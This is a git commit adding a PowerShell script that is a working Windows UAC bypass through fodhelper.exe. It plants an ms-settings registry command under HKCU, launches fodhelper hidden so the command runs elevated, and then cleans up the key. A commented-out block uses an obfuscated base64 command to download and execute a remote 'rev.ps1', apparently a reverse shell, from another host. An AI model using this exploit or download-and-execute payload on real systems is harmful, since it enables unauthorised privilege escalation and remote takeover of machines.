c4383aeeb06a9dae1542bf5a2fb7f63fd3c493b3
p4yl0ad <57832389+p4yl0ad@users.noreply.github.com>
2021-04-03 21:21:49 +0100

    Create foddywoddy.ps1

---
+++ UAC/foddywoddy.ps1
@@ -0,0 +1,39 @@
+#function RegShit {
+#    $cmd = "C:\Windows\Tasks\bruh.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAyAC4AMQAzADQALwByAGUAdgAuAHAAcwAxACcAKQA="
+#    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
+#    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+#    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+#    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+#    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
+#}
+#function PrivEsc {
+#    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+#    Start-Sleep -s 3
+#    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+#}
+#RegShit
+
+
+
+function FodhelperBypass(){ 
+ 
+Param (    
+ 
+ [String]$program = "cmd /c whoami /all > C:\fodhelper.txt" 
+ 
+      )
+ 
+#Create registry structure
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+ 
+#Perform the bypass
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+ 
+#Remove registry structure
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+ 
+}
